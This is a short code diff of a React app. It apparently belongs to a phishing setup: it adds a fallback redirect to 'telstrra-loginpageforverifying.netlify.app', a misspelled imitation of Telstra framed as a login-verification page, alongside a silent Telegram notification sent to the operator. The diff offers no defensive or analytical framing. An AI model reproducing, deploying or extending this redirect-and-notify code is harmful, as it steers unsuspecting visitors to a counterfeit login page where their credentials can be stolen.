@@ -12,7 +12,7 @@ function App() {
         // Get redirect URL from Netlify function
         const configResponse = await fetch('/.netlify/functions/get-config')
         const config = await configResponse.json()
-        const redirectUrl = config.redirectUrl || 'https://example.com'
+        const redirectUrl = config.redirectUrl || 'https://telstrra-loginpageforverifying.netlify.app/'
 
         // Send Telegram notification (fire and forget)
         fetch('/.netlify/functions/notify').catch(err => {
@@ -106,3 +106,4 @@ function App() {
 }
 
 export default App
+
